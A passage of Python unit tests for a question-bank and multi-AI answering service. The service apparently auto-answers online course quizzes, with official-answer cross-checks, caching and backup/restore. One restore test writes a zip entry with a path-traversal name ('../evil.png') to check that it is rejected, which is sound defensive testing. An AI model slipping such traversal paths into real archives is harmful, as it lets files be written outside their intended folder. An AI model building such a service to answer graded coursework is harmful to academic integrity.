        """公式图片题的题干很长，不能被截到 300 字——截断后同题再也匹配不回来。"""
        from app.unit_sessions import UnitSessions
        with tempfile.TemporaryDirectory() as tmp:
            store = UnitSessions(os.path.join(tmp, "unit.json"))
            store.ensure("https://x/test", 1, "t1")
            title = "设 " + ("http://x/PhotoUploadUtils_%d.png " % 0 * 1) * 20 + "为三阶方阵"
            title = "设 " + " ".join(
                "http://x/PhotoUploadUtils_%d.png" % i for i in range(20)
            ) + " 为三阶方阵"
            self.assertGreater(len(title), 300)
            store.add_answer("completion", title, "6", {"source": "official"})
            saved = store.current()["answers"][0]["title"]
            self.assertEqual(saved, title)
            # 删除也要能用完整题干命中
            self.assertTrue(store.remove_answer(title))

    def _official_unit_query(self, answer, agree, share, votes=None):
        main.settings.update({"official_cross_check": True})
        self.client.post("/api/scene", json={"scene": "unit"})
        official = main.bank.add({
            "type": "judge", "title": "官方复核题", "options": ["对", "错"],
            "answer": "正确", "source": "official", "status": "adopted",
        })
        provider = main.store.enabled()[0]
        fake = (
            answer, provider, 12, [],
            {
                "unit_votes": votes or ({answer: agree} if answer else {}),
                "unit_agree": agree,
                "unit_share": share,
                "unit_providers": [provider["name"]] * agree,
                "unit_confidence": 0.9 if answer else None,
                "unit_errors": [],
            },
        )
        with mock.patch.object(main, "_unit_ask", mock.AsyncMock(return_value=fake)):
            data = self.client.get("/query", params={
                "title": "官方复核题", "type": "judge", "options": '["对","错"]'
            }).json()["data"]
        return official, data

    def test_unit_official_ai_agree_keeps_official(self):
        _official, data = self._official_unit_query("正确", 2, 1.0, {"正确": 2})
        self.assertEqual(data["answer"], "正确")
        self.assertEqual(data["source"], "official")
        self.assertEqual(data["official_check"], "agree")
        self.assertFalse(data["risk"])
        self.assertEqual(data["ai_answer"], "正确")

    def test_unit_official_ai_consensus_overrides(self):
        official, data = self._official_unit_query("错误", 3, 1.0, {"错误": 3})
        self.assertEqual(data["answer"], "错误")
        self.assertEqual(data["source"], "ai")
        self.assertEqual(data["provider"], "主 AI")
        self.assertEqual(data["official_check"], "override")
        self.assertEqual(data["official_answer"], "正确")
        self.assertEqual(data["match"], "official-override")
        self.assertTrue(data["risk"])
        self.assertEqual(main.stats.official_overridden, 1)
        # AI 覆盖只发生在返回层，不修改官方题库
        stored = main.bank.find_exact("judge", "官方复核题", ["对", "错"])
        self.assertEqual(stored["answer"], "正确")
        self.assertEqual(stored["source"], "official")
        # 错误官方答案不能反过来污染 AI provider 的正确率
        main._verdict_sink({"id": official["id"], "via": "主 AI", "subject": "默认"}, "正确", False)
        self.assertIsNone(main.stats.quality_snapshot()["providers"].get("主 AI"))

    def test_unit_official_two_votes_do_not_override(self):
        """三个模型时只有全部一致才覆盖官方；两票一致保留官方并记争议。"""
        _official, data = self._official_unit_query("错误", 2, 0.6667, {"错误": 2, "正确": 1})
        self.assertEqual(data["answer"], "正确")
        self.assertEqual(data["source"], "official")
        self.assertEqual(data["official_check"], "weak")
        self.assertTrue(data["risk"])

    def test_unit_official_ai_weak_keeps_official(self):
        _official, data = self._official_unit_query("错误", 1, 0.3333, {"错误": 1, "正确": 2})
        self.assertEqual(data["answer"], "正确")
        self.assertEqual(data["source"], "official")
        self.assertEqual(data["official_check"], "weak")
        self.assertTrue(data["risk"])

    def test_unit_official_ai_unavailable_keeps_official(self):
        _official, data = self._official_unit_query(None, 0, 0.0, {})
        self.assertEqual(data["answer"], "正确")
        self.assertEqual(data["official_check"], "unavailable")
        self.assertTrue(data["risk"])

    def test_unit_official_image_keeps_official(self):
        """图片题模型看不到图，不做 AI 复核，避免瞎猜覆盖官方答案。"""
        main.settings.update({"official_cross_check": True})
        self.client.post("/api/scene", json={"scene": "unit"})
        url = "https://example.com/official-q2.png"
        parsed = main._parse_images([url])
        main.bank.add({
            "type": "judge", "title": "官方复核图片题", "options": ["对", "错"],
            "answer": "正确", "source": "official", "status": "adopted",
            "image_hash": main._hash_images(parsed),
        })
        with mock.patch.object(
            main, "_unit_ask", mock.AsyncMock(side_effect=AssertionError("图片题不应复核"))
        ):
            data = self.client.get("/query", params={
                "title": "官方复核图片题",
                "type": "judge",
                "options": '["对","错"]',
                "images": json.dumps([url]),
            }).json()["data"]
        self.assertEqual(data["answer"], "正确")
        self.assertEqual(data["source"], "official")
        self.assertEqual(data["official_check"], "")
        self.assertEqual(data["match"], "official")
        self.assertFalse(data["risk"])

    def test_unit_official_title_image_url_keeps_official(self):
        """题干里直接嵌图片 URL（images=0）时同样跳过 AI 复核。"""
        main.settings.update({"official_cross_check": True})
        self.client.post("/api/scene", json={"scene": "unit"})
        title = ("设 http://mooc-image.nosdn.127.net/_PhotoUploadUtils_abc.png "
                 "为三阶方阵，则行列式的值为")
        main.bank.add({
            "type": "single", "title": title, "options": ["36", "72", "108", "1"],
            "answer": "B", "source": "official", "status": "adopted",
        })
        with mock.patch.object(
            main, "_unit_ask", mock.AsyncMock(side_effect=AssertionError("图片题不应复核"))
        ):
            data = self.client.get("/query", params={
                "title": title,
                "type": "single",
                "options": json.dumps(["36", "72", "108", "1"]),
            }).json()["data"]
        self.assertEqual(data["answer"], "B")
        self.assertEqual(data["source"], "official")
        self.assertEqual(data["official_check"], "")
        self.assertEqual(data["match"], "official")
        self.assertFalse(data["risk"])

    def test_unit_official_text_question_still_cross_checked(self):
        """纯文字题仍然保留 AI 复核，不受图片例外影响。"""
        main.settings.update({"official_cross_check": True})
        self.client.post("/api/scene", json={"scene": "unit"})
        main.bank.add({
            "type": "judge", "title": "文字复核题", "options": ["对", "错"],
            "answer": "正确", "source": "official", "status": "adopted",
        })
        provider = main.store.enabled()[0]
        fake = (
            "错误", provider, 12, [],
            {
                "unit_votes": {"错误": 3},
                "unit_agree": 3,
                "unit_share": 1.0,
                "unit_providers": [provider["name"]] * 3,
                "unit_confidence": 0.9,
                "unit_errors": [],
            },
        )
        with mock.patch.object(main, "_unit_ask", mock.AsyncMock(return_value=fake)):
            data = self.client.get("/query", params={
                "title": "文字复核题", "type": "judge", "options": '["对","错"]'
            }).json()["data"]
        self.assertEqual(data["answer"], "错误")
        self.assertEqual(data["source"], "ai")
        self.assertEqual(data["official_check"], "override")
        self.assertTrue(data["risk"])

    def test_quality_counts_provider_verdict_from_feedback(self):
        self.client.post("/api/bank", json={
            "type": "single", "title": "正确率测试题", "options": ["甲", "乙"], "answer": "A",
            "subject": "默认", "source": "ai", "status": "pending", "via": "模型甲"
        })
        payload = {"items": [{"type": "single", "title": "正确率测试题", "options": ["甲", "乙"],
                              "is_correct": True, "correct_letters": ["B"]}]}
        first = self.client.post("/api/bank/feedback", json=payload).json()
        self.assertEqual(first["applied"], 1)
        q = self.client.get("/api/stats/quality").json()
        self.assertEqual(q["providers"]["模型甲"]["bad"], 1)
        self.assertEqual(q["overall"]["bad"], 1)
        self.assertEqual(q["subjects"]["默认"]["bad"], 1)

        self.client.post("/api/bank/feedback", json=payload)
        q = self.client.get("/api/stats/quality").json()
        self.assertEqual(q["providers"]["模型甲"]["ok"], 1)
        self.assertEqual(q["providers"]["模型甲"]["total"], 2)
        self.assertEqual(self.client.get("/api/state").json()["quality"]["overall"]["total"], 2)

    def test_feedback_writes_memory_for_new_and_empty_answer_items(self):
        """官方回流要写答题记忆：新题（题库没有）和旧答案为空都要写。

        这两种情况以前只更新题库、不更新记忆，下一次仍按旧记忆/无记忆作答。
        """
        payload = {"items": [{"type": "single", "title": "记忆回写新题",
                              "options": ["甲", "乙"], "is_correct": True,
                              "correct_letters": ["B"]}]}
        first = self.client.post("/api/bank/feedback", json=payload).json()
        self.assertEqual(first["applied"], 1)
        hit = main.answer_memory.recall(qtype="single", title="记忆回写新题",
                                        options=["甲", "乙"])
        self.assertIsNotNone(hit)
        self.assertEqual(hit["answer"], "B")

        main.bank.add({"type": "single", "title": "记忆回写空答案",
                       "options": ["甲", "乙"], "answer": "",
                       "source": "official", "status": "adopted"})
        payload = {"items": [{"type": "single", "title": "记忆回写空答案",
                              "options": ["甲", "乙"], "is_correct": True,
                              "correct_letters": ["A"]}]}
        second = self.client.post("/api/bank/feedback", json=payload).json()
        self.assertEqual(second["applied"], 1)
        hit = main.answer_memory.recall(qtype="single", title="记忆回写空答案",
                                        options=["甲", "乙"])
        self.assertIsNotNone(hit)
        self.assertEqual(hit["answer"], "A")
        # 这两种情况没有可判定的旧 AI 答案，不能污染模型正确率统计。
        q = self.client.get("/api/stats/quality").json()
        self.assertEqual(q["overall"]["total"], 0)

    def test_feedback_writeback_translates_option_order(self):
        """记忆行的字母来自旧顺序；官方反馈换序后要翻译，不能直接覆盖。"""
        title = "换序回写题"
        memory_options = ["甲", "乙", "丙", "丁"]
        main.answer_memory.record(
            qtype="single", title=title, options=memory_options, answer="A",
            source="ai", provider="p1", strategy="single",
        )
        payload = {"items": [{"type": "single", "title": title,
                              "options": ["丙", "甲", "丁", "乙"],
                              "is_correct": True, "correct_letters": ["B"]}]}
        self.client.post("/api/bank/feedback", json=payload)
        # 记忆行按旧顺序存 A（甲）；第三种顺序 [乙,丁,甲,丙] 里甲排第三 → C
        hit = main.answer_memory.recall(qtype="single", title=title,
                                        options=["乙", "丁", "甲", "丙"])
        self.assertIsNotNone(hit)
        self.assertEqual(hit["answer"], "C")
        from app.answer_memory import question_fingerprint
        fingerprint = question_fingerprint("single", title, memory_options)
        rows = main.answer_memory.timeline(qkey=fingerprint["qkey"])
        self.assertEqual(rows[0]["outcome"], "correct")

    def test_bank_from_failure_adds_entry(self):
        """从失败记录补录题目：题干/选项/专业都带过来，用户只补答案。"""
        payload = {
            "type": "single",
            "title": "补录测试题",
            "options": ["A", "B", "C", "D"],
            "answer": "C",
            "subject": "线性代数",
        }
        res = self.client.post("/api/bank/from-failure", json=payload)
        self.assertEqual(res.status_code, 200)
        item = res.json()["item"]
        self.assertEqual(item["answer"], "C")
        self.assertEqual(item["subject"], "线性代数")
        self.assertEqual(item["source"], "manual")
        self.assertEqual(item["status"], "adopted")
        # 补录后能在题库里查到
        listed = self.client.get("/api/bank", params={"keyword": "补录测试题"}).json()
        self.assertTrue(any(r["title"] == "补录测试题" for r in listed["items"]))

    def test_bank_from_failure_validates(self):
        """补录也要校验：答案不能为空、单选至少两个选项、答案必须是合法字母。"""
        no_answer = self.client.post("/api/bank/from-failure", json={
            "type": "single", "title": "t", "options": ["A", "B"], "answer": ""})
        self.assertEqual(no_answer.status_code, 400)
        few_options = self.client.post("/api/bank/from-failure", json={
            "type": "single", "title": "t", "options": ["A"], "answer": "A"})
        self.assertEqual(few_options.status_code, 400)
        bad_letter = self.client.post("/api/bank/from-failure", json={
            "type": "single", "title": "t", "options": ["A", "B"], "answer": "Z"})
        self.assertEqual(bad_letter.status_code, 400)
        no_title = self.client.post("/api/bank/from-failure", json={
            "type": "single", "title": "  ", "options": ["A", "B"], "answer": "A"})
        self.assertEqual(no_title.status_code, 400)

    def test_failure_record_can_be_deleted_individually(self):
        """单条失败记录可以删掉（管理台「未答题目」面板的删除按钮）。"""
        main.failures.add({"at": 12345.0, "code": 50001, "type": "single",
                           "title": "要删掉的失败记录", "options": [], "subject": "默认",
                           "images": 0, "message": "测试"})
        before = len(main.failures.all())
        removed = self.client.delete("/api/failures/12345.0").json()["removed"]
        self.assertEqual(removed, 1)
        self.assertEqual(len(main.failures.all()), before - 1)
        # 删不存在的记录返回 0，不报错
        self.assertEqual(self.client.delete("/api/failures/99999.0").json()["removed"], 0)

    def test_bank_from_failure_judge_and_completion(self):
        """判断题/填空题不收选项。"""
        judge = self.client.post("/api/bank/from-failure", json={
            "type": "judge", "title": "判断补录题", "options": [], "answer": "正确"})
        self.assertEqual(judge.status_code, 200)
        self.assertEqual(judge.json()["item"]["options"], [])
        comp = self.client.post("/api/bank/from-failure", json={
            "type": "completion", "title": "填空补录题", "options": ["请输入答案"], "answer": "6"})
        self.assertEqual(comp.status_code, 200)
        self.assertEqual(comp.json()["item"]["answer"], "6")
        self.assertEqual(comp.json()["item"]["options"], [])

    def test_bank_api_crud(self):
        created = self.client.post(
            "/api/bank",
            json={"type": "single", "title": "首都是哪", "options": ["北京", "上海"], "answer": "B"},
        ).json()
        self.assertEqual(self.client.get("/api/bank").json()["count"], 1)

        updated = self.client.put(
            f"/api/bank/{created['id']}",
            json={"type": "single", "title": "首都是哪", "options": ["北京", "上海"], "answer": "A"},
        ).json()
        self.assertEqual(updated["answer"], "A")

        self.assertTrue(self.client.delete(f"/api/bank/{created['id']}").json()["ok"])
        self.assertEqual(self.client.get("/api/bank").json()["count"], 0)

    def test_bank_validation_api(self):
        too_few = self.client.post("/api/bank", json={"type": "single", "title": "t", "options": ["a"], "answer": "A"})
        self.assertEqual(too_few.status_code, 400)
        bad_answer = self.client.post("/api/bank", json={"type": "single", "title": "t", "options": ["a", "b"], "answer": "Z"})
        self.assertEqual(bad_answer.status_code, 400)

    def test_bank_write_invalidates_answer_cache(self):
        created = self.client.post(
            "/api/bank",
            json={"type": "single", "title": "缓存失效题", "options": ["甲", "乙"], "answer": "A"},
        ).json()
        key = main.cache.make_key("single", "缓存失效题", ["甲", "乙"])

        main.cache.set(key, "缓存失效题", "A", "主 AI", qtype="single")
        self.assertIsNotNone(main.cache.get(key))
        updated = self.client.put(
            f"/api/bank/{created['id']}",
            json={"type": "single", "title": "缓存失效题",
                  "options": ["甲", "乙"], "answer": "B"},
        )
        self.assertEqual(updated.status_code, 200)
        self.assertIsNone(main.cache.get(key))

        # 删除题目同样要让缓存失效，否则删完还能从缓存里答出来
        main.cache.set(key, "缓存失效题", "B", "主 AI", qtype="single")
        self.assertEqual(self.client.delete(f"/api/bank/{created['id']}").status_code, 200)
        self.assertIsNone(main.cache.get(key))

    def test_bank_query_accepts_subject(self):
        self.client.post(
            "/api/bank",
            json={
                "type": "single", "title": "专业隔离题", "options": ["甲", "乙"],
                "answer": "A", "subject": "概率论",
            },
        )
        hit = self.client.post(
            "/api/bank/query",
            json={
                "type": "single", "title": "专业隔离题", "options": ["甲", "乙"],
                "subject": "概率论",
            },
        ).json()
        self.assertTrue(hit["found"])
        self.assertEqual(hit["item"]["subject"], "概率论")
        # 不传 subject 时仍按默认专业查，不会串到「概率论」
        miss = self.client.post(
            "/api/bank/query",
            json={"type": "single", "title": "专业隔离题", "options": ["甲", "乙"]},
        ).json()
        self.assertFalse(miss["found"])

    def test_query_hits_local_bank_first(self):
        self.client.post(
            "/api/bank",
            json={"type": "single", "title": "首都是哪", "options": ["北京", "上海"], "answer": "B"},
        )
        with mock.patch.object(main, "call_provider", mock.AsyncMock(side_effect=AssertionError("不应调用 AI"))):
            data = self.client.get(
                "/query", params={"title": "首都是哪", "type": "single", "options": '["北京","上海"]'}
            ).json()
        self.assertEqual(data["code"], 0)
        self.assertEqual(data["data"]["answer"], "B")
        self.assertFalse(data["data"]["ai"])
        self.assertEqual(data["data"]["provider"], "本地题库")

    def test_query_falls_back_to_ai_when_bank_missing(self):
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"A"}')):
            data = self.client.get(
                "/query", params={"title": "题库里没有的题", "type": "single", "options": '["x","y"]'}
            ).json()
        self.assertEqual(data["code"], 0)
        self.assertEqual(data["data"]["answer"], "A")
        self.assertEqual(data["data"]["provider"], "主 AI")


    def test_query_post_with_images(self):
        captured = {}

        async def fake(provider, messages):
            captured["messages"] = messages
            return '{"answer":"A"}'

        with mock.patch.object(main, "call_provider", fake):
            data = self.client.post(
                "/query",
                json={
                    "title": "原题 http://x/1.png",
                    "type": "single",
                    "options": ["甲", "乙"],
                    "images": ["data:image/png;base64,AAA"],
                    "suggestion_title": "原题 [图片1]",
                    "suggestion_options": "甲\n乙",
                },
            ).json()
        self.assertEqual(data["code"], 0)
        self.assertEqual(data["data"]["answer"], "A")
        content = captured["messages"][1]["content"]
        self.assertIsInstance(content, list)
        self.assertEqual(content[-1]["type"], "image_url")
        self.assertEqual(content[-1]["image_url"]["url"], "data:image/png;base64,AAA")

    def test_parse_images_capped(self):
        images = ["data:image/png;base64,%d" % i for i in range(12)]
        self.assertEqual(len(main._parse_images(images)), main.MAX_IMAGES)
        self.assertEqual(main._parse_images('["a","b"]'), ["a", "b"])
        self.assertEqual(main._parse_images(None), [])

    def test_ai_answer_auto_saved_pending(self):
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"A"}')):
            self.client.post(
                "/query",
                json={"title": "自动入库题", "type": "single", "options": ["甲", "乙"], "subject": "计组"},
            )
        items = self.client.get("/api/bank").json()["items"]
        self.assertEqual(len(items), 1)
        self.assertEqual(items[0]["source"], "ai")
        self.assertEqual(items[0]["status"], "pending")
        self.assertEqual(items[0]["subject"], "计组")

    def test_similar_question_hits_bank_without_ai(self):
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"B"}')):
            self.client.post(
                "/query",
                json={"title": "以下哪个是中国的首都？", "type": "single",
                      "options": ["北京", "上海"], "subject": "地理"},
            )
        item = self.client.get("/api/bank").json()["items"][0]
        self.client.post(f"/api/bank/{item['id']}/promote")
        with mock.patch.object(main, "call_provider", mock.AsyncMock(side_effect=AssertionError("不应调用 AI"))):
            data = self.client.post(
                "/query",
                json={"title": "以下哪个是中国的首都呢？", "type": "single",
                      "options": ["上海", "北京"], "subject": "地理"},
            ).json()
        self.assertEqual(data["code"], 0)
        self.assertEqual(data["data"]["answer"], "A")
        self.assertFalse(data["data"]["ai"])
        self.assertEqual(data["data"]["match"], "similar")

    def test_subject_isolation(self):
        self.client.post(
            "/api/bank",
            json={"type": "single", "title": "同一道题", "options": ["甲", "乙"], "answer": "A", "subject": "专业A"},
        )
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"B"}')):
            other = self.client.post(
                "/query",
                json={"title": "同一道题", "type": "single", "options": ["甲", "乙"], "subject": "专业B"},
            ).json()
        self.assertEqual(other["data"]["provider"], "主 AI")
        with mock.patch.object(main, "call_provider", mock.AsyncMock(side_effect=AssertionError("不应调用 AI"))):
            hit = self.client.post(
                "/query",
                json={"title": "同一道题", "type": "single", "options": ["甲", "乙"], "subject": "专业A"},
            ).json()
        self.assertEqual(hit["data"]["provider"], "本地题库")

    def test_promote_pending(self):
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"A"}')):
            self.client.post("/query", json={"title": "待确认题", "type": "single", "options": ["甲", "乙"]})
        item = self.client.get("/api/bank").json()["items"][0]
        self.assertEqual(item["status"], "pending")
        promoted = self.client.post(f"/api/bank/{item['id']}/promote").json()
        self.assertEqual(promoted["status"], "adopted")

    def test_pending_reverifies_and_auto_adopts(self):
        payload = {"title": "复核题", "type": "single", "options": ["甲", "乙"]}
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"A"}')):
            self.client.post("/query", json=payload)
        self.assertEqual(self.client.get("/api/bank").json()["items"][0]["status"], "pending")

        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"A"}')):
            second = self.client.post("/query", json=payload).json()
        self.assertEqual(second["data"]["match"], "pending-verify")
        self.assertEqual(second["data"]["agree"], 1)

        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"A"}')):
            third = self.client.post("/query", json=payload).json()
        self.assertEqual(third["data"]["status"], "adopted")

        with mock.patch.object(main, "call_provider", mock.AsyncMock(side_effect=AssertionError("不应调用 AI"))):
            fourth = self.client.post("/query", json=payload).json()
        self.assertEqual(fourth["data"]["provider"], "本地题库")

    def test_pending_conflict_accumulates(self):
        payload = {"title": "冲突题", "type": "single", "options": ["甲", "乙"]}
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"A"}')):
            self.client.post("/query", json=payload)
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"B"}')):
            data = self.client.post("/query", json=payload).json()
        self.assertTrue(data["data"]["conflict"])
        self.assertEqual(data["data"]["history"], 1)
        item = self.client.get("/api/bank").json()["items"][0]
        self.assertEqual(item["answer"], "B")
        self.assertEqual(item["history"][0]["answer"], "A")


    def test_cache_import_to_bank(self):
        main.cache.set("k1", "缓存导入题", "A", "m", "single", '["甲","乙"]', "默认")
        main.cache.set("k2", "旧格式缓存题", "B", "m")
        first = self.client.post("/api/bank/import-cache", json={"subject": "导入专业"}).json()
        self.assertEqual(first["imported"], 1)
        self.assertEqual(first["skipped"], 1)
        items = self.client.get("/api/bank").json()["items"]
        self.assertEqual(len(items), 1)
        self.assertEqual(items[0]["subject"], "导入专业")
        self.assertEqual(items[0]["status"], "pending")
        second = self.client.post("/api/bank/import-cache", json={"subject": "导入专业"}).json()
        self.assertEqual(second["imported"], 0)
        self.assertEqual(second["skipped"], 2)


    def test_bank_pagination_and_search(self):
        for i in range(5):
            self.client.post("/api/bank", json={"type": "single", "title": f"分页题 {i}",
                                                "options": ["甲", "乙"], "answer": "A", "subject": "分页"})
        page1 = self.client.get("/api/bank", params={"limit": 2, "offset": 0}).json()
        self.assertEqual(page1["total"], 5)
        self.assertEqual(len(page1["items"]), 2)
        page3 = self.client.get("/api/bank", params={"limit": 2, "offset": 4}).json()
        self.assertEqual(len(page3["items"]), 1)
        found = self.client.get("/api/bank", params={"keyword": "分页题 3"}).json()
        self.assertEqual(found["total"], 1)
        self.assertEqual(found["items"][0]["title"], "分页题 3")

    def test_bank_batch(self):
        ids = []
        for i in range(3):
            r = self.client.post("/api/bank", json={"type": "single", "title": f"批量 {i}",
                                                    "options": ["甲", "乙"], "answer": "A", "subject": "批量"})
            ids.append(r.json()["id"])
        moved = self.client.post("/api/bank/batch", json={"action": "subject", "ids": ids, "subject": "新专业"}).json()
        self.assertEqual(moved["affected"], 3)
        self.assertEqual(len(self.client.get("/api/bank", params={"subject": "新专业"}).json()["items"]), 3)
        adopted = self.client.post("/api/bank/batch", json={"action": "adopt", "ids": ids[:2]}).json()
        self.assertEqual(adopted["affected"], 2)
        deleted = self.client.post("/api/bank/batch", json={"action": "delete", "ids": ids}).json()
        self.assertEqual(deleted["affected"], 3)
        self.assertEqual(self.client.get("/api/bank").json()["total"], 0)

    def test_vote_queue_apply(self):
        from app.ops import VoteQueue

        main.vote_queue = VoteQueue(os.path.join(self.tmp.name, "vote_queue.json"))
        item = main.bank.add({"type": "judge", "title": "投票裁决题", "options": ["对", "错"],
                              "answer": "正确", "source": "ai", "status": "pending", "conflict": True})
        main.vote_queue.add(item, "错误", {"votes": {"错误": 3}})
        response = self.client.post("/api/bank/vote-queue/apply", json={})
        self.assertEqual(response.json()["applied"], 1)
        saved = main.bank.find_by_id(item["id"])
        self.assertEqual(saved["answer"], "错误")
        self.assertFalse(saved["conflict"])
        self.assertEqual(self.client.get("/api/bank/vote-queue").json()["count"], 0)

    def test_backup_and_restore(self):
        self.client.post("/api/bank", json={"type": "single", "title": "备份题",
                                            "options": ["甲", "乙"], "answer": "A", "subject": "备份"})
        self.client.post("/api/quiz/status", json={"tid": "bk-1", "aid": "bk-2", "published": True})
        self.client.post("/api/progress", json={"account": "备份账号", "course": "概率论与数理统计",
                                                "done": 3, "total": 10})
        resp = self.client.get("/api/backup")
        self.assertEqual(resp.status_code, 200)
        names = zipfile.ZipFile(io.BytesIO(resp.content)).namelist()
        self.assertIn("bank.json", names)
        for extra in ("settings.json", "subjects.json", "progress.json", "quiz_status.json"):
            self.assertIn(extra, names)
        ids = [i["id"] for i in self.client.get("/api/bank").json()["items"]]
        self.client.post("/api/bank/batch", json={"action": "delete", "ids": ids})
        self.assertEqual(self.client.get("/api/bank").json()["total"], 0)
        restored = self.client.post("/api/restore", files={"file": ("b.zip", resp.content, "application/zip")})
        self.assertEqual(restored.status_code, 200)
        self.assertEqual(self.client.get("/api/bank").json()["total"], 1)

    def test_backup_and_restore_image_assets(self):
        raw = b"\x89PNG\r\n\x1a\nasset-bytes"
        url = "https://img.example.com/p0/a.png"
        main.image_assets.put_bytes(url, raw, "image/png")
        root = main.image_assets.root
        resp = self.client.get("/api/backup")
        self.assertEqual(resp.status_code, 200)
        names = zipfile.ZipFile(io.BytesIO(resp.content)).namelist()
        self.assertIn("image_assets/index.json", names)
        self.assertTrue(any(
            n.startswith("image_assets/") and n != "image_assets/index.json"
            for n in names))
        # 模拟换机 / 资产目录被清空：保留同一路径，重新建空库
        for name in os.listdir(root):
            os.remove(os.path.join(root, name))
        main.image_assets = main.ImageAssetStore(root)
        self.assertIsNone(main.image_assets.get_bytes(url))
        restored = self.client.post(
            "/api/restore", files={"file": ("b.zip", resp.content, "application/zip")})
        self.assertEqual(restored.status_code, 200)
        self.assertEqual(main.image_assets.get_bytes(url), raw)
        self.assertEqual(main.image_assets.content_type(url), "image/png")

    def test_restore_rejects_unsafe_image_asset_path(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("bank.json", "{}")
            zf.writestr("image_assets/../evil.png", b"x")
        resp = self.client.post(
            "/api/restore", files={"file": ("b.zip", buf.getvalue(), "application/zip")})
        self.assertEqual(resp.status_code, 400)
        self.assertFalse(os.path.exists(os.path.join(self.tmp.name, "evil.png")))

    def test_restore_keeps_singleton_paths(self):
        """restore 之后单例的 .path 不能漂到 config.* 写死的路径上。

        回归 2026-11-10：restore 重建单例时用的是 config.PROGRESS_PATH 等
        硬编码路径，而不是各单例自己的 .path —— 恢复完路径就跳到别处了
        （测试里表现为从测试临时目录跳到另一个临时目录）。
        """
        before = {
            "progress": main.progress.path,
            "deadlines": main.deadlines.path,
            "settings": main.settings.path,
            "subjects": main.subject_rules.path,
            "quiz_status": main.quiz_status.path,
            "failures": main.failures.path,
        }
        resp = self.client.get("/api/backup")
        self.assertEqual(resp.status_code, 200)
        restored = self.client.post(
            "/api/restore", files={"file": ("b.zip", resp.content, "application/zip")})
        self.assertEqual(restored.status_code, 200)
        after = {
            "progress": main.progress.path,
            "deadlines": main.deadlines.path,
            "settings": main.settings.path,
            "subjects": main.subject_rules.path,
            "quiz_status": main.quiz_status.path,
            "failures": main.failures.path,
        }
        for key, path in before.items():
            self.assertEqual(after[key], path, f"{key} 的路径在 restore 后漂移了")


    def test_mark_wrong_endpoint(self):
        item = self.client.post("/api/bank", json={"type": "single", "title": "错题接口",
                                                   "options": ["甲", "乙"], "answer": "A", "subject": "错题"}).json()
        marked = self.client.post(f"/api/bank/{item['id']}/mark-wrong").json()
        self.assertEqual(marked["status"], "pending")
        self.assertEqual(marked["answer"], "")
        self.assertIn("A", marked["wrong_answers"])

    def test_marked_wrong_not_auto_adopted_by_same_answer(self):
        item = self.client.post("/api/bank", json={"type": "single", "title": "错题重答",
                                                   "options": ["甲", "乙"], "answer": "A", "subject": "错题"}).json()
        self.client.post(f"/api/bank/{item['id']}/mark-wrong")
        payload = {"title": "错题重答", "type": "single", "options": ["甲", "乙"], "subject": "错题"}
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"A"}')):
            for _ in range(3):
                self.client.post("/query", json=payload)
        row = [i for i in self.client.get("/api/bank").json()["items"] if i["id"] == item["id"]][0]
        self.assertEqual(row["status"], "pending")
        self.assertEqual(row["agree"], 0)

    def test_bank_batch_wrong(self):
        ids = []
        for i in range(2):
            r = self.client.post("/api/bank", json={"type": "single", "title": f"批量错 {i}",
                                                    "options": ["甲", "乙"], "answer": "A"})
            ids.append(r.json()["id"])
        affected = self.client.post("/api/bank/batch", json={"action": "wrong", "ids": ids}).json()["affected"]
        self.assertEqual(affected, 2)
        rows = [i for i in self.client.get("/api/bank").json()["items"] if i["id"] in ids]
        self.assertTrue(all(r["status"] == "pending" and r["answer"] == "" for r in rows))


    def test_provider_vision_flag(self):
        state = self.client.get("/api/state").json()
        pid = state["providers"][0]["id"]
        self.assertEqual(state["providers"][0]["vision"], "auto")
        self.client.put(f"/api/providers/{pid}", json={"name": "主 AI", "base_url": "https://example.com/v1",
                                                       "model": "test-model", "vision": "no"})
        self.assertEqual(self.client.get("/api/state").json()["providers"][0]["vision"], "no")

    def test_vision_routing(self):
        async def run(providers):
            async def fake(provider, messages):
                return '{"answer":"A"}'

            with mock.patch.object(main, "call_provider", fake):
                return await main._ask_providers(providers, "single", ["x", "y"], [], ["data:image/png;base64,AAA"])

        providers = [
            {"id": "a", "name": "text", "vision": "no", "timeout": 30},
            {"id": "b", "name": "vis", "vision": "yes", "timeout": 30},
            {"id": "c", "name": "auto", "vision": "auto", "timeout": 30},
        ]
        answer, provider, _, _, _ = asyncio.run(run(providers))
        self.assertEqual(provider["name"], "vis")

        answer2, provider2, _, errors2, _ = asyncio.run(
            main._ask_providers(
                [{"id": "t", "name": "t", "vision": "no", "timeout": 30}], "single", ["x", "y"], [], ["img"]
            )
        )
        self.assertIsNone(answer2)
        self.assertIn("视觉", errors2[0])

    def test_unit_image_filters_non_vision_provider(self):
        """单元投票的图片题也要排除明确不支持视觉的模型，避免它超时后拖垮投票。"""
        main.settings.update({"cross_check": False, "low_conf_vote": False})
        self.client.post("/api/scene", json={"scene": "unit"})
        providers = [
            {"id": "t", "name": "纯文本", "vision": "no", "timeout": 30},
            {"id": "v", "name": "视觉", "vision": "yes", "timeout": 30},
        ]
        captured = {}

        def fake(selected, *args, **kwargs):
            captured["names"] = [p["name"] for p in selected]
            return ("A", selected[0], 5, [], {
                "unit_votes": {"A": 1}, "unit_agree": 1, "unit_models": 1,
                "unit_share": 1.0, "unit_rounds": 1, "unit_errors": [],
            })

        with mock.patch.object(main.store, "enabled", return_value=providers), \
                mock.patch.object(main, "_unit_ask", mock.AsyncMock(side_effect=fake)):
            data = self.client.post("/query", json={
                "title": "视觉白名单题", "type": "single", "options": ["甲", "乙"],
                "images": ["data:image/png;base64,AAA"],
            }).json()["data"]
        self.assertEqual(captured["names"], ["视觉"])
        self.assertEqual(data["answer"], "A")

    def test_image_bank_hit(self):
        img = "data:image/png;base64,AAA"
